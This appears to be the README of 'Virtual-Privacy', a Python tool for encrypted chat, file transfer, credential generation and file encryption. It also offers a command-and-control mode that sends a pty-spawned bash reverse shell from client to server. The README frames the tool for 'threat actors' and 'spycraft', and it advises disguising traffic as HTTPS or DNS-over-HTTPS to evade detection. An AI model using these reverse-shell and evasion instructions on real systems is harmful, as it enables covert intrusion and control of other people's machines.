# Virtual-Privacy

Virtual-Privacy (VP) is a Pythonic Swiss army knife for conducting covert communications over insecure networks, and secure data storage. VP features 4 levels of encryption, 24 host iterations (command and control, file transfers, and a chatroom), and a number of options for generating credentials. VP additonally offers the ability to encrypt a file, directory, or an entire path recursively. VP features a unique network security protocol that emulates and incorporates popular protocols like SSH, PGP, and SSL. 

It should be noted, the host operation, chat, is styled after AOL chat rooms circa 1999, but with the added feature of layered encryption to create a communication medium suitable for individuals working in contemporary spycraft.

---

## In this README.md:

You will find a comprehensive manual that will teach you how to use all of the easy features that the program offers to conduct covert communications, and encryted data storage!


---


## Index:

1) [Installation](#installation)
2) [Host Operations](#host-operations)
3) [Levels of Encryption](#levels-of-encryption)
4) [Generate Credentials](#generate-credentials)
5) [Database Operations](#database-operations)
6) [Encryption & Decryption](#encryption_and_decryption)


---

## Installation

VP uses one non-standard Python library, `pycryptodome`. 

VP also requires OpenSSL.

**To install Virtual-Privacy:**

1) Download Virtual-Privacy:

```bash
git clone https://github.com/0x00wolf/virtual-privacy
```

2) Navigate to the parent directory:

```bash
cd ./virtual-privacy
```

3) Create a virtual environment, activate it, and install pycryptodome:

```bash
python -m venv venv && source ./venv/bin/activate && pip install pycryptodome
```

4) Generate some credentials, throw some reverse shells, and have fun!

**At runtime:** The program will check to see if the following directories exist in the program's parent directory or it will generate them: ./keys/local, ./keys/remote, and ./data. The program uses the runtime `--user` | `-u` argument to select the SQL database to use, allowing users to create multiple databases for different purposes by simply creating a new user key. See [user](#user) for more information.

---


## Host Operations

`--server` | `-s` & `--client` | `-c`

Both client and server operating modes feature 12 iterations on 3 host 
archetypes: Command & Control (c2), File Transfers (ftp), & Chatroom (chat).

Each operating mode has 4 variations, relative to the different encryption 
levels VP offers. The user simply needs to supply the required credentials 
for the desired operating mode, and VP will select the correct host at 
runtime. For more information on VP's encryption options, see: 
[VP Encryption Options](#vp-encryption-options). 

Required Args:
- Mode: `--client OPERATION` | `-c OPERATION` or `--server OPERATION` | `-s OPERATION`

Operations:
- `c2`: See [c2](#c2)
- `ftp`: See [ftp](#ftp)
- `chat`: See [chat](#chat)

Optional Sever Args:
- `--host` | `-ip`: Hostname or IPv4 address. Defaults to loopback for testing, `127.0.0.1`.
- `--port` | `-p`: Port number. Defaults to 1337.
- `--only-ssl` | `-os`: Required for the server to use SSL without VPP. See: [Levels of Encryption](#levels-of-encryption)
- `--user` | `-u`: Generate a new, or reference an existing, SQL database. See: [user](#user)
- `--private-key` | `-pr`: Path to the user's RSA private key.
- `--certificate` | `-crt`: Path to the server's signed x509 certificate.

Optional Client Args:
- `--host` | `-ip`: Hostname or IPv4 address. Defaults to loopback for testing, `127.0.0.1`.
- `--port` | `-p`: Port number. Defaults to 1337.
- `--only-ssl` | `-os`: Required for the server to use SSL without VPP. See: [Levels of Encryption](#levels-of-encryption)
- `--user` | `-u`: Generate a new, or reference an existing, SQL database. See: [user](#user)
- `--private-key` | `-pr`: Path to the user's RSA private key.
- `--public-key` | `-pu`: Path to the remote server's RSA public key. 
- `--certificate` | `-crt`: Path to the server's signed x509 certificate.
- `--target` | `-t`: Sets the saved parameters for `target` server nickname.

Basic Usage:

```bash
# Long form:
python vp.py --server OPERATION
python vp.py --client OPERATION

# Short form:
python vp.py -s c2
python vp.py -c c2
```

---

### **c2**

`python vp.py --server c2`

VP's Command & Control mode sends a Pythonic reverse shell from the client 
to the server:

`subprocess.Popen['python', '-i', ,'import pty', 'pty.spawn('/bin/bash')]` 

The client runs the shell in a subprocess and uses Pipes to funnel the stdin, stdout & 
stderr over the network connection, allowing VP to encrypt the data streams 
in the process. VP uses multithreading, pipes, and queues to create a 
smooth reverse shell experience, while encrypting data in transit.  


---


### ftp

`python vp.py --client ftp`

VP's ftp transfers allow for secure data transfer. Alternatively, you can 
use VP's file encryption to encrypt a file in advance of transfer so that 
only the intended recipient will be able to decrypt it. Pairing file 
encryption with secure data transmission makes for a very high degree of 
security.


---


### chat

`python vp.py -s chat`

VP's Chat is styled after an AOL chatroom from 1999, but with heavy layers of modern encryption. 

After a client connects, the server will decrypt messages from each client, and then broadcast them to every connected client, encrypting each with their respective credentials (depending on the encryption level in use). The chatroom uses multithreading, and is conceieably capable of handling hundreds if not thousands of concurrent hosts, although that isn't very secretive. 

The Chatroom was the initial inspiration for this project. I thought it would be funny to create an AOL chatroom that would be suitable for high level threat actors. A lot of my projects begin this way. I had a silly idea that I started to build, and then realized cool things I could make it do.


---


## Levels of Encryption

1) [Base64](#base64)
2) [SSL](#ssl)
3) [VPP](#vpp)
4) [SSL and VPP](#vpp_and_ssl)


---


## Base64

By default all communications are encoded with Base64. Although this 
doesn't provide confidentially, integrity, or authenticity, it provides a 
base layer of obfuscation to communications, which is often used by threat 
actors while acquiring a foothold on a new network.

**Leve 1: Base64 examples**

Server-side:

```bash
# Server-side long form:
python vp.py --server c2 --host 0.0.0.0 --port 1337

# Server-side short form:
python vp.py -s c2 -ip 0.0.0.0 -p 1337
```


Client-side:

```bash
# Client-side long form:
python vp.py --client c2 --host 192.168.2.15 --port 1337

# Client-side short form:
python vp.py -c c2 -ip 192.168.2.15 -p 1337
```

---


### SSL

VP's second level of encryption allows users to encrypt communications with 
TLSv1.3. SSL provides end-to-end encryption, alternatively, it also enables 
users to mask their communications as regular traffic, particularly if they 
utilize a common port like 443, or 853 for the server connection, which 
would make traffic look like HTTPs, DoT, or DoH.

See [Generate Credentials](#generate-credentials) for VP's built in options 
for producing the required credentials. Fast-gen, [fast-gen](#fast-gen), in particular, will 
immediately spit out everything you need.


**Server args:**
- `--private-key` | `-pr`: The RSA private key used to either self-sign the x509 certificate, or create the certificate signing request signed by a root CA.
- `--certificate` | `-crt`: The signed x509 certificate
- `--only-ssl` | `-os`: VPP & SSL have the same requirements for credentials, so this argument is necessary to inform VP to only use SSL. 

**Client args:**
- `--certificate` | `crt`: Either the root CA signed certificate, or a server self-signed certificate.

**Level 2: SSL examples**

Server-side:

```bash
# Server-side long form:
python vp.py --server c2 --host 0.0.0.0 --port 1337 --private-key ./key.pem --certificate ./cert.crt --only-ssl

# Server-side short form:
python vp.py -s c2 -ip 0.0.0.0 -p 1337 -pr ./key.pem -crt ./cert. -os
```

Client-side:

```bash
# Client-side short form:
python vp.py --client c2 --host 192.168.2.15 --port 1337 --certificate ./cert.crt

# Client-side short form:
python vp.py -c c2 -ip 192.168.2.15 -p 1337 -crt ./cert.crt
```


---


## VPP

The Virtual Privacy Protocol provides authenticity, confidentiality, and 
integrity. It utilizes hybrid encryption, and signature verification for each transmission. VPP requires that both parties have exchanged RSA public keys in advance. The server administrator must register the remote user's public key in the runtime SQL database in advance of the client connecting. See [Database Operations](#database_operations), specifically [add-key](#add_key). The client has to provide the server's RSA public key as a runtime argument. 
For detailed information on generating an RSA keypair, see [Generate Credentials](#generate-credentials).

VPP authentication works as follows:

**Client-side:**

1) The client’s plaintext RSA public key is signed using their private key.
2) The Client’s plaintext public key is encrypted with a new 256-bit session key.
3) The session key is wrapped with the server’s RSA public key.
4) The wrapped session key is transmitted to the server.

**Server-side:**

1) The server accepts a buffer containing the wrapped key & VP’s protocol header and attempts to unwrap the key.
2) If the key was unwrapped, the server accepts a buffer of a size relative to information provided by the protocol header.
3) The server slices off the first 384 bytes of the payload (the signature), and attempts to decrypt the remainder with the unwrapped key.
4) The server verifies the contents of the decrypted message are a known RSA public key in the runtime SQL database.
5) The server verifies that the signature belongs to the owner of the known key.

**After authentication:**

The client and server continue to use the same steps, however, the composition of the messages changes somewhat. Both client and server prepare a payload of containing the ciphertext data, a signature of the data unencrypted, and the wrapped key. A 16 byte fixed length protocol header is transmitted first, which contains a binary string, representing the payload's length in bytes. The receiver than accepts a buffer of that size, and goes about the decryption process. The chat server doesn't limit the total size of packets, however both the reverse shell and FTP will transmit in chunks behind the scenes if the ciphertext exceeds a certain length.

For more information on VPP, see: [vpp](#vpp)

To generate credentials for VPP, see: [rsa](#rsa)

**Server args:**
- `--private-key` | `-pr`: The server's RSA private key
- Clients added to the runtime SQL database: [add-key](#add_key)

**Client args:**
- `--private-key` | `-pr`: The client's RSA private key.
- `--public-key` | `-pu`: The server's RSA public key.

**Level 3: VPP Examples**

Server-side:

```bash
# Server-side long form:
python vp.py --server c2 --host 0.0.0.0 --port 1337 --private-key ./server_privkey.pem

# Server-side short form:
python vp.py -s c2 -ip 0.0.0.0 -p 1337 -pr ./server_privkey.pem
```

Client-side:

```bash
# Client-side short form:
python vp.py --client c2 --host 192.168.2.15 --port 1337 --private-key ./my_privkey.pem --public-key ./server_pubkey.pem

# Client-side short form:
python vp.py -c c2 -ip 192.168.2.15 -p 1337 -pr ./my_privkey.pem -pu ./server_pubkey.pem
```


---


## SSL and VPP

VPP wrapped in TLSv1.3 for obfuscation and robust security. 

**Server args:**
- `--private-key` | `-pr`: The path to the server's RSA private key
- `--certificate` | `-crt`: The path to the server's signed x509 certificate.
- The RSA public keys of remote clients added to the runtime SQL database, see: [add-key](#add_key)

**Level 4: VPP & SSL Examples**

Server-side:

```bash
# Server-side long form:
python vp.py --server c2 --host 0.0.0.0 --port 1337 --private-key ./keys/local/srvr_privkey.pem --certificate ./cert.crt

# Server-side short form:
python vp.py -s c2 -ip 0.0.0.0 -p 1337 -pr ./keys/local/srvr_privkey.pem -crt ./cert.
```

Client-side:

```bash
# Client-side short form:
python vp.py --client c2 --host 192.168.2.15 --port 1337 --private-key ./keys/local/my_privkey.pem --public-key ./keys/remote/srvr_pubkey.pem --certificate ./cert.crt

# Client-side short form:
python vp.py -c c2 -ip 192.168.2.15 -p 1337 -pr ./keys/local/my_privkey.pem -pu ./keys/remote/srvr_pubkey.pem -crt ./cert.crt
```


---


## Generate Credentials

Credential operations can be accessed via the generate-pki runtime argument:

```bash
# long form
python vp.py --generate-pki [OPERATION]

# short form
python vp.py -pki [OPERATION]
```

VP provides four options for users to generate credentials. The first option 
uses pycryptodome to generate an RSA key pair, including 
optional private key encryption using best practices. The remaining three 
options are wrappers for OpenSSL, which allow VP users to credentials for 
SSL on the fly, or establish more in depth PKI, including a root 
Certificate Authority. 

1) [rsa](#rsa)
2) [self-sign](#self-sign)
3) [fast-gen](#fast-gen)
4) [root-ca](#root-ca)


---


### rsa

`rsa`

This function allows the user to generate a new RSA keypair, with optional 
password encryption. 

Note: Both optional arguments must be supplied for the program to accept 
them.

Optional Args:
- `--private-key` | `-pr`: Supply the export path for the private key in advance
- `--public-key` | `-pu`: Suppy the export path for the public key in advance.

```bash

# Long form:
python vp.py --generate-pki rsa

# Short form
python vp.py -pki rsa

# Optional, supply export paths in advance: 
python vp.py -pki rsa --private-key ./keys/local/my_privkey.pem --public-key  ./keys/local/my_pubkey.pem
```


---


### self-sign

`self-sign` | `ss`

This operation takes a preexisting RSA private key and uses it to produce a 
self-signed x509 certificate for establishing SSL. 

Args:
- `--private-key` | `-pr`: Path to an RSA private key

Optional args:
- `--certificate` | `-crt`: Optional export path for the signed x509 
certificate. 

Default export path: 
- `-crt ./cert.crt`

```bash
# Long form:
python vp.py --generate-pki self-sign --private-key ./keys/local/srvr_privkey.pem  

# Short form:
python vp.py -pki ss -pr ./local/srvr_privkey.pem

# With an optional export path for the certificate
python vp.py -pki ss -pr ./keys/local/srvr_privkey.pem --certificate ./keys/local/srvr_cert.crt
```


---


### **fast-gen**

`fast-gen` | `fg`

This operation instantly spits out the necessary credentials for 
establishing a SSL encrypted connection, a new RSA private key and signed 
x509 certificate.

Optional args:
- `--private-key` | `-pr`: The export path for the RSA private key.
- `--certificate` | `-crt`: The export path for the signed certificate.

Defaults:
- `-pr ./key.pem -crt ./cert.crt`

```bash
# Long form:
python vp.py --generate-pki fast-gen

# Short form:
python vp.py -pki fg

```


---


### **root-ca**

`root-ca` | `ca`

The `root-ca` operation allows users to interactively generate public 
key infrastructure. The output from this operation includes creating a root 
Certificate Authority, a server RSA keypair, and a CA signed certificate 
for the server.

Takes no args.

```bash
# Long form:
python vp.py --generate-pki root-ca

# Short form:
python vp.py -pki ca
```


---


## Encryption and Decryption

`--encrypt [OPERATION]` | `-e [OPERATION]` 
& `--decrypt [OPERATION]` | `-d [OPERATION]`

VP features the ability to encrypt or decrypt files, a single directory non-recursively, or a path recursively. You can also add signature authentication into the encryption process. You can additonally sign files as you encrypt them, allowing for additional layers of encryption and authenticity for files hosted with VP's `--server ftp` host operation.

1) [file](#file)
2) [dir](#dir)
3) [path](#path)


---


### file

`file`

VP's file encryption option is useful for remote data transfer. The encryption process is very similar to the VP protocol, with the exception that the wrapped key (and optional RSA signature) are prepended to the file. During [Decryption](#Decryption) they are sliced off and used in the same sequence as described in [VPP](#VPP). 

Encryption Required Args:
- `--file-in` | `-fi`: The file to be encrypted.
- `--public-key` | `-pu`: The RSA public key of the individual who will decrypt the file.

Decryption required args:
- `--file-in` | `-fi`: The file to be decrypted.
- `--private-key` | `-pr`: The matching RSA private key to the public key used for encryption. Used to decrypt the files with VPP.

Optional args:
- `--file-out` | `-fo`: An optional export path. Note that by using a non-default path, the original unencrypted file will remain in it's original location after encryption.
- `--private-key` | `-pr`: Optional RSA private key to include signature verification in the encryption process.
- `--public-key` | `-pu`: The RSA public key to verify the signature, if necessary. If signature verification was used, decryption will failwithout the provided public key, unless you change the code for `crypter.decrypt.signed_file()`.

Encryption examples:

```bash
# Encryption long form:
python vp.py --encrypt file --public-key ./keys/remote/Bobcat_public.pem --file-in ./secretmessage.txt

# Encryption short form:
python vp.py -e f -pu ./keys/remote/Bobcat_public.pem -fi ./secretmessage.txt

# Encryption short form with optional file out and signature authentication:
python vp.py -e f -pu ./keys/remote/Bobcat_public.pem -pr ./keys/local/my_privkey.pem -fi ./secretmessage.txt -fo ./secret4bobcat.enc
```

Decryption examples:

```bash
# Decrypt long form:
python vp.py --decrypt file --private-key ./keys/local/my_privkey.pem -fi ./path/to/secret4bobcat.enc

# Decrypt short form:
python vp.py -d f -pr ./keys/local/my_privkey.pem -fi ./path/to/secret4bobcat.enc

# Decrypt short form with optional RSA signature verification and a non default export path:
python vp.py -d f -pr ./keys/local/my_privkey.pem -fi ./path/to/secret4bobcat.enc -pu ./keys/remote/jedi_public.pem -fo ./unencryptedsecret4me.txt
```


---


### dir

`dir`

Encrypt a directory, without encrypting files found in any subdirectories. Optional RSA signature authentcation is available, but simply due to the fact the same function works behind the scenes to encrypt data. Logically, this operation is a tool for local secure data storage, along with the `path` operation, and not particularly useful for network file transfers more so than any other operation modes. Note that any file within an encrypted directory or path can be unencrypted with the `--decrypt file` operation ([decrypt file](#decrypt-file)).


Required Args:
- `--file-in` | `-fi`: The path to the directory that will be encrypted.
- `--public-key` | `-pu`: The RSA public key of the individual who will decrypt the directory.

Optional args:
- `--private-key` | `-pr`: Optional RSA private key to include signature verification in the encryption process.

Encryption examples:

```bash
# Long form:
python vp.py --encrypt dir --public-key ./keys/local/my_pubkey.pem --file-in /path/to/secrets_directory

# Short form:
python vp.py -e d -pu ./keys/local/my_pubkey.pem -fi ./path/to/secrets_directory
```

Decryption examples:

```bash
# Decrypt long form:
python vp.py --decrypt dir --private-key ./keys/local/my_privkey.pem -fi ./path/to/encrypted_dir

# Decrypt short form:
python vp.py -d d -pr ./keys/local/my_privkey.pem -fi ./path/to/encrypted_dir
```


---


### path

`path`

Encrypt a path, recursively encrypting files found in any subdirectories. Optional RSA signature authentcation is available, but simply due to the fact the same function works behind the scenes to encrypt data. Logically, this operation is a tool for secure local data storage, alongwith the following operation, `dir`. Note that any file within an encrypted directory or path can be unencrypted with the `--decrypt file` operation ([file](#file)).


Required Args:
- `--file-in` | `-fi`: The path that will be encrypted.
- `--public-key` | `-pu`: The RSA public key belonging to the individual who will decrypt the path.

Optional args:
- `--private-key` | `-pr`: Optional RSA private key to include signature verification in the encryption process.

Encryption examples:

```bash
# Encrypt long form:
python vp.py --encrypt path --public-key ./keys/local/my_pubkey.pem --file-in /path/to/secrets_path

# Encypt short form:
python vp.py -e p -pu ./keys/local/my_pubkey.pem -fi ./path/to/secrets_path
```

Decryption examples:

```bash
# Decrypt long form:
python vp.py --decrypt path --private-key ./keys/local/my_privkey.pem -fi ./path/to/encrypted_path

# Decrypt short form:
python vp.py -d p -pr ./keys/local/my_privkey.pem -fi ./path/to/encrypted_path
```


---


## Database Operations

`--database` | `db`

VP is backed by a SQLite3 database, which will be generated at runtime if not found by the program. VPP requires that remote client's RSA public keys be added to the runtime SQL database. Beyond simply using the public keys for hybrid encryption, VPP uses the keys for authentication.

1) [user](#user)
2) [target](#target)
3) [add-key](#add-key)
4) [show-key](#show-key)
5) [show-keys](#show-keys)
6) [delete-key](#delete-key)
7) [add-target](#add-target)
8) [show-target](#show-target)
9) [show-targets](#show-targets)
10) [delete-target](#delete-target)
11) [show-tables](#show-tables)


---


### user

`--user` | `-u`

Set the SQL database name key at runtime to initialize a new database, or reference a pre-existing database. The `--user` argument can be used with the server and client mode to reference a particular databse. The primary use case here is if you want to establish different runtime databases to limit external clients whose public keys you have added from connecting to a specific server instance. 

Saves the database to the data directory, found within VP's parent folder.

Example:

```bash
# Long form:
python vp.py --database --user Jedi
```


---


### target

`--target` | `-t`

This runtime argument, like `--user`, can be used with multiple operating modes. For database operations it will be utilized to set nicknames when saving RSA public keys (optional) or the information to connect to remote servers (required).


---



### add-key

`add-key`

Add a remote client's RSA public key to the runtime SQL database.

Required Args:
- `--public-key` | `-pr`: The remote user's RSA public key.

Optional Args:
- `--target` | `-t`: Set a nickname for the public key.

Example:

```bash
# Long form:
python vp.py --database add-key --public-key ./keys/remote/bobcats_pubkey.pem --target Bobcat

# Short form:
python vp.py -db ak -pu ./keys/remote/bobcats_pubkey.pem -t Bobcat
```


---


### show-key

`show-key` | `sk`    

Show a saved public key by ID or nickname.

Args:
- `--target` | `-t`: The target nickname or ID number (shown at creation if no nickname is supplied).

Example:

```bash
# Long form:
python vp.py --database show-key --target Jedi

# Short form:
python vp.py -db sk -t Bobcat
```


---


### show-keys

`show-keys`

Displays information about all the stored keys.

```bash
# Long form:
python vp.py --database show-keys

# Short form:
python vp.py -db show-keys
```


---


### delete-key

`delete-key`

Args:
- `--target` | `-t`: The target nickname or ID number (shown at creation if no nickname is supplied).

Example:

```bash
# Long form:
python vp.py --database delete-key --target Bobcat

# Short form:
python vp.py -db sk -t Jedi
```


---


### add-server

`add-server` | `as`    

Save connection information for a remote server in the SQL database. Use the `--target` option at runtime to initiailize the variables.

Args: 
- `--target` | `-t`: Server's nickname.
- `--host` | `-ip`: The hostname or IPv4 address.
- `--port` | `-p`: The port.

Optional Args:
- `--public-key` | `-pu`: The path to the server's public key. 
- `--certificate` | `-crt`: The path to the server's signed x509 certificate.

Example:

```bash
# Long form:
python vp.py --database add-server --target Jedi --host www.jedibuddy.com --port 1337 --public-key ./keys/remote/jedi_public.pem --certificate ./keys/remote/jedi_cert.crt

# Short form:
python vp.py -db as -t Jedi -ip www.jedibuddy.com -p 1337 -pu ./keys/remote/jedi_public.pem -crt ./keys/remote/jedi_cert.crt
```


---


### show-server

`show-server` | `ss`

Required Args: 
- `--target` | `-t`:  The target nickname.

Example:

```bash
# Short form:
python vp.py --database show-server --target Bobcat

# Long form:
python vp.py -db ss -t Bobcat
```


---


### delete-server

`delete-server`

Deletes a target server based on a supplied `--target` nickname.

Args:
- `--target` | `-t`: The target nickname.

Example:

```bash
# Long form:
python vp.py --database delete-key --target Bobcat

# Short form:
python vp.py -db sk -t Jedi
```


---


### show-servers

`show-servers`

Displays information about all the stored servers.

```bash
# Long form:
python vp.py --database show-servers

# Short form:
python vp.py -db show-servers
```


---

